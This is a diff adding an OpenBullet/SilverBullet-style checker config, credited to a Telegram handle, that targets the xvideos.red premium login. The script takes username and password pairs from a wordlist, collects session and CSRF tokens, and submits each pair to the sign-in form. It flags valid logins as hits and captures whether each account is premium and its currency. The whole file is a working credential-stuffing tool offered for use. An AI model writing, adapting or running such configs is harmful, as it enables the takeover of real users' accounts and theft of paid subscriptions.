@@ -1,0 +1,198 @@
+[SETTINGS]
+{
+  "Name": "xvideos.com -1",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2026-08-17T04:35:09.2865102-07:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "https://t.me/sussboyy",
+  "Version": "1.1.4 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "xvideos",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+FUNCTION URLEncode "<USER>" -> VAR "US" 
+
+FUNCTION URLEncode "<PASS>" -> VAR "PS" 
+
+REQUEST GET "https://www.xvideos.com/" ReadResponseSource=FALSE 
+  
+  HEADER "Host: www.xvideos.com" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 9; A5010 Build/PI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.70 Mobile Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "Referer: https://www.google.com/" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Connection: close" 
+
+PARSE "<COOKIES(session_token)>" LR "" "" -> VAR "Orbit1" 
+
+REQUEST GET "https://www.xvideos.red/" ReadResponseSource=FALSE 
+  
+  HEADER "Host: www.xvideos.red" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 9; A5010 Build/PI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.70 Mobile Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "Referer: https://www.xvideos.com/" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Connection: close" 
+
+PARSE "<COOKIES(session_token)>" LR "" "" -> VAR "Orbit2" 
+
+REQUEST POST "https://www.xvideos.com/cross_site_cookies" 
+  CONTENT "l=<Orbit2>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.xvideos.com" 
+  HEADER "Cookie: session_token=<Orbit1>; wpn_ad_cookie=cca689fe39b3241f62436037a1d696da; session_ath=black; pending_thumb=%7B%22t%22%3A%5B%5D%2C%22s%22%3A%5B%5D%2C%22p%22%3A%5B%5D%2C%22r%22%3A%5B%5D%7D" 
+  HEADER "Content-Length: 384" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "Device-Memory: 2" 
+  HEADER "Origin: https://www.xvideos.red" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 9; A5010 Build/PI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.70 Mobile Safari/537.36" 
+  HEADER "Viewport-Width: 857" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Referer: https://www.xvideos.red/" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Connection: close" 
+
+PARSE "<SOURCE>" JSON "session_token" -> VAR "Orbit3" 
+
+REQUEST GET "https://tracking.sexcash.com/in/track.js?s=xvideosred&aff=4353LFJE75&d=1697728290259&u=%2F&r=https%3A%2F%2Fwww.xvideos.com%2F" 
+  
+  HEADER "Host: tracking.sexcash.com" 
+  HEADER "Device-Memory: 2" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 9; A5010 Build/PI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.70 Mobile Safari/537.36" 
+  HEADER "Viewport-Width: 980" 
+  HEADER "Accept: */*" 
+  HEADER "Referer: https://www.xvideos.red/" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Connection: close" 
+
+PARSE "<SOURCE>" LR "var newCookie = \"" "\";" -> VAR "TOKEN0" 
+
+REQUEST POST "https://www.xvideos.red/account/checklogin" 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.xvideos.red" 
+  HEADER "Cookie: stafc=4353LFJE75; sxcafred=<TOKEN0>; sxc_affiliate=4353LFJE75; product_offer=; session_token=<Orbit3>" 
+  HEADER "Content-Length: 0" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "Device-Memory: 2" 
+  HEADER "Origin: https://www.xvideos.red" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 9; A5010 Build/PI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.70 Mobile Safari/537.36" 
+  HEADER "Viewport-Width: 857" 
+  HEADER "Referer: https://www.xvideos.red/" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Connection: close" 
+
+PARSE "<COOKIES(session_token)>" LR "" "" -> VAR "Orbit4" 
+
+REQUEST POST "https://www.xvideos.red/account/signinform/premium_tour_login" 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.xvideos.red" 
+  HEADER "Cookie: stafc=4353LFJE75; sxcafred=<TOKEN0>; sxc_affiliate=4353LFJE75; product_offer=; session_token=<Orbit4>" 
+  HEADER "Content-Length: 0" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "Device-Memory: 2" 
+  HEADER "Origin: https://www.xvideos.red" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 9; A5010 Build/PI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.70 Mobile Safari/537.36" 
+  HEADER "Viewport-Width: 857" 
+  HEADER "Referer: https://www.xvideos.red/" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Connection: close" 
+
+PARSE "<SOURCE>" LR "name=\\\"signin-form[post_referer]\\\" id=\\\"signin-form_post_referer\\\" \\/>\\n<input type=\\\"hidden\\\" value=\\\"" "\\\"" -> VAR "TOKEN1" 
+
+REQUEST POST "https://www.xvideos.red/account/signinform/premium_tour" 
+  CONTENT "signin-form%5Bform%5D=&signin-form%5Bvotes%5D=&signin-form%5Bsubs%5D=&signin-form%5Bpost_referer%5D=https%3A%2F%2Fwww.xvideos.red%2F&signin-form%5Bcsrf_token%5D=<TOKEN1>&signin-form%5Bpms%5D=&signin-form%5Blogin%5D=<US>&signin-form%5Bpassword%5D=<PS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.xvideos.red" 
+  HEADER "Cookie: stafc=4353LFJE75; sxcafred=<TOKEN0>; sxc_affiliate=4353LFJE75; product_offer=; session_token=<Orbit4>" 
+  HEADER "Content-Length: 0" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "Device-Memory: 2" 
+  HEADER "Origin: https://www.xvideos.red" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 9; A5010 Build/PI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.70 Mobile Safari/537.36" 
+  HEADER "Viewport-Width: 857" 
+  HEADER "Referer: https://www.xvideos.red/" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Connection: close" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "form_valid\":false" 
+  KEYCHAIN Success OR 
+    KEY "form_valid\":true" 
+
+PARSE "<SOURCE>" JSON "is_premium" CreateEmpty=FALSE -> CAP "is_Premium" 
+
+PARSE "<SOURCE>" JSON "user_currency" CreateEmpty=FALSE -> CAP "Currency" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "is_premium\":false" 
+
+FUNCTION Constant "https://t.me/sussboyy" -> CAP "Config By : " 
+
